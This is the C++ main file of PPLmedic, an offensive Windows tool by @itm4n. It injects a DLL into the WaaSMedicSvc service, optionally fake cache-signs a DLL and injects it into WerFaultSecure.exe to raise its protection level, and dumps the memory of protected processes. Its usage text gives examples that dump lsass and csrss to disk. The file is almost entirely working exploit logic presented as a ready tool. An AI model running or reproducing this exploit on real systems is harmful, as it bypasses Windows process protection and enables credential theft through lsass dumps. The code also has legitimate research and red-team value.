#include <iostream>
#include "Utils.h"
#include "Exploit.h"
#include "ExploitElevate.h"
#include "Client.h"

#if !defined(_WIN64)
#error Only x64 architecture is supported.
#endif

void PrintUsage(wchar_t* argv[]);
BOOL ConnectClient(Client* client);

int wmain(int argc, wchar_t* argv[])
{
    Exploit* exploit = nullptr;
    ExploitElevate* exploit_elevate = nullptr;
    Client* client = nullptr;

    Command cmd = Command::Undefined;
    LPWSTR pwszDumpfilePath = NULL;
    DWORD dwProcessId = 0;
    BOOL bElevateProtectionLevel = FALSE;
    DWORD dwSigningLevel = 0;

    if (argc < 2)
    {
        PrintUsage(argv);
        return 1;
    }

    --argc;
    ++argv;

    //
    // Process positional arguments
    //

    if (!_wcsicmp(argv[0], STR_PPLMEDIC_CMD_DUMP))
    {
        cmd = Command::ProcessDump;
        --argc;
        ++argv;

        if (argc < 2)
        {
            ERROR(L"Invalid number of arguments.");
            return 1;
        }

        if (!(dwProcessId = wcstoul(argv[0], nullptr, 10)))
        {
            ERROR(L"Failed to parse argument as a valid integer: %ws", argv[0]);
            return 1;
        }

        pwszDumpfilePath = argv[1];

        if (Utils::FileExists(pwszDumpfilePath))
        {
            ERROR(L"File already exists: %ws", pwszDumpfilePath);
            return 1;
        }

        argc -= 2;
        argv += 2;
    }
    else if (!_wcsicmp(argv[0], STR_PPLMEDIC_CMD_RESTORE))
    {
        cmd =  Command::Restore;
        --argc;
        ++argv;
    }
    else
    {
        ERROR(L"Unknown command: %ws", argv[0]);
        return 1;
    }

    //
    // Process optional arguments
    //

    while (argc)
    {
        if (argv[0][0] != L'-')
        {
            ERROR(L"Invalid option: %ws", argv[0]);
            return 1;
        }

        switch (argv[0][1])
        {
        case 'p':
            bElevateProtectionLevel = TRUE;
            break;
        }

        --argc;
        ++argv;
    }

    exploit = new Exploit();

    //
    // If we just want to restore the registry values, do this and exit.
    //

    if (cmd == Command::Restore)
    {
        if (!exploit->Restore())
        {
            ERROR(L"Failed to restore registry keys.");
            goto cleanup;
        }

        SUCCESS(L"The registry keys were reset to their default values.");

        goto cleanup;
    }

    //
    // Run the exploit to inject our DLL in the WaaSMedicSvc service.
    //

    if (!exploit->Run())
    {
        ERROR(L"Exploit failed");
        goto cleanup;
    }

    //
    // If the exploit is successful, try to connect to the remote named pipe.
    //

    client = new Client(STR_IPC_PIPE_NAME);

    if (!ConnectClient(client))
        goto cleanup;

    //
    // If the user wants to get the highest protection level, try to create a
    // fake cached signature for our DLL and inject it in WerFaultSecure.exe.
    // Do this only if it is relevant (e.g. a process memory dump). 
    //

    if (bElevateProtectionLevel && (cmd == Command::ProcessDump))
    {
        INFO(L"Attempting to get a higher process protection level...");

        exploit_elevate = new ExploitElevate();

        if (!exploit_elevate->Initialize())
        {
            ERROR(L"Failed to initialize protection elevation exploit.");
            goto cleanup;
        }

        if (!client->FakeSignDll(exploit_elevate->GetPayloadDllFilePath(), exploit_elevate->GetSignedDllFilePath(), &dwSigningLevel))
        {
            ERROR(L"Failed to cache sign '%ws' (LE: %d).", exploit_elevate->GetSignedDllFilePath(), client->GetLastError());
            goto cleanup;
        }

        if (dwSigningLevel < SE_SIGNING_LEVEL_WINDOWS)
        {
            ERROR(L"Unexpected cached signing level: %d - %ws", dwSigningLevel, Utils::GetSigningLevelAsString(dwSigningLevel));
            goto cleanup;
        }

        SUCCESS(L"Target file '%ws' should now be cache signed (level=%d - %ws).", exploit_elevate->GetSignedDllFilePath(), dwSigningLevel, Utils::GetSigningLevelAsString(dwSigningLevel));

        //
        // We must delete the client to let the server currently running in
        // WaaSMedicSvc know that it can stop and thus free the named pipe.
        // The named pipe will be reused if our DLL is successfully injected
        // in WerFaultSecure.
        //

        delete client;
        client = nullptr;

        if (!exploit_elevate->Run())
        {
            ERROR(L"Failed to inject DLL in protected process.");
            goto cleanup;
        }

        client = new Client(STR_IPC_PIPE_NAME);

        if (!ConnectClient(client))
            goto cleanup;
    }

    switch (cmd)
    {
    case Command::ProcessDump:

        if (!client->DumpProcessMemory(dwProcessId, pwszDumpfilePath))
        {
            ERROR(L"Failed to dump memory of process with PID %d (LE: %d).", dwProcessId, client->GetLastError());
            goto cleanup;
        }

        SUCCESS(L"Memory dump of process with PID %d successful: %ws", dwProcessId, pwszDumpfilePath);

        break;
    }

cleanup:
    if (client) delete client;
    if (exploit_elevate) delete exploit_elevate;
    if (exploit) delete exploit;

    INFO(L"All done.");

    return 0;
}

void PrintUsage(wchar_t* argv[])
{
    wprintf(
        L""
        " _____ _____ __                _ _     \r\n"
        "|  _  |  _  |  |   _____ ___ _| |_|___ \r\n"
        "|   __|   __|  |__|     | -_| . | |  _|  version 0.1\r\n"
        "|__|  |__|  |_____|_|_|_|___|___|_|___|  by @itm4n\r\n"
        "\r\n"
        "Description:\r\n"
        "  Dump the memory of a Protected Process Light (PPL) with a *userland* exploit\r\n"
        "\r\n"
        "Usage:\r\n"
        "  %ws %ws <PID> <DUMP_FILE> [-p]\r\n"
        "  %ws %ws\r\n"
        "\r\n"
        "Commands:\r\n"
        "  %-10ws: dump the memory of a PPL\r\n"
        "  %-10ws: restore the registry keys (use only if the tool was interrupted)\r\n"
        "\r\n"
        "Options:\r\n"
        "  %-10ws: elevate from PPL-Windows to PPL-WinTcb\r\n"
        "\r\n"
        "Examples:\r\n"
        "  PPLmedic.exe dump 756 C:\\Temp\\lsass.dmp\r\n"
        "  PPLmedic.exe dump 520 C:\\Temp\\csrss.dmp -p\r\n"
        "\r\n",
        argv[0],
        STR_PPLMEDIC_CMD_DUMP,
        argv[0],
        STR_PPLMEDIC_CMD_RESTORE,
        STR_PPLMEDIC_CMD_DUMP,
        STR_PPLMEDIC_CMD_RESTORE,
        STR_PPLMEDIC_OPT_ELEVATE
    );
}

BOOL ConnectClient(Client* client)
{
    DWORD dwProtectionLevel = PROTECTION_LEVEL_NONE;

    if (!client->Connect())
    {
        ERROR(L"Failed to open IPC connection.");
        return FALSE;
    }

    INFO("Connected to remote process.");

    if (!client->GetProtectionLevel(&dwProtectionLevel))
    {
        ERROR(L"Failed to retrieve protection level (LE: %d).", client->GetLastError());
        return FALSE;
    }

    SUCCESS(L"Remote process protection level: 0x%08x (%ws)", dwProtectionLevel, Utils::GetProcessProtectionLevelAsString(dwProtectionLevel));

    if (dwProtectionLevel == PROTECTION_LEVEL_NONE)
    {
        ERROR(L"The remote process does not seem to be protected, something went wrong.");
        return FALSE;
    }

    return TRUE;
}